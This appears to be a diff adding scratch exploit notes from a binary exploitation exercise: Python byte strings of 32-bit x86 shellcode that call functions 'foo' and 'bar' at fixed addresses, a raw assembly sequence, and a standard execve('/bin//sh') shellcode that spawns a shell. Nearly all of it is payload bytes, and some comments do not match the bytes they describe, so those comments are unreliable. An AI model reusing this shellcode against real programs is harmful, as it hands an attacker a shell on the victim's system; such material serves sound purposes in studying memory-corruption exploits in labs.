@@ -1,0 +1,58 @@
+shellcode_2 = (
+"\x6a\x04"             #push   4             (Setting Parameter x1 = 4)
+"\xbb\x44\x85\x04\x08" #mov    ebx,0x804853e (Move entry point of bar to edx)
+"\xff\xd3"             #call   ebx           (Call the function bar)
+
+"\x50"                 #push   eax           (Return value is stored at eax. 
+                       #                      Setting Paratemer x1 = last return value)
+"\xff\xd3"             #call   ebx           (Calling bar again)
+).encode('latin-1')
+
+
+
+	# 0x565562d1 bar
+	shellcode = (
+"\x6a\x04"             #push   4             (Setting Parameter x1 = 4)
+"\xbb\xd1\x62\x55\x56" #mov    ebx,0x804853e (Move entry point of bar to edx)
+"\xff\xd3"             #call   ebx           (Call the function bar)
+
+"\x50"                 #push   eax           (Return value is stored at eax. 
+                       #                      Setting Paratemer x1 = last return value)
+"\xff\xd3"             #call   ebx           (Calling bar again)
+).encode('latin-1')
+
+
+	# 0x56556286 foo
+	push   7
+push   1
+mov    ebx,0x56556286
+call   ebx
+
+push 0
+push 17
+call   ebx
+
+push 5
+push eax
+call   ebx
+
+push 0
+push eax
+call   ebx
+
+
+push 0
+push eax
+call   ebx
+
+push 3
+push eax
+call   ebx
+
+
+
+shellcode= (
+	  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+	  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+	  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
+	).encode('latin-1')
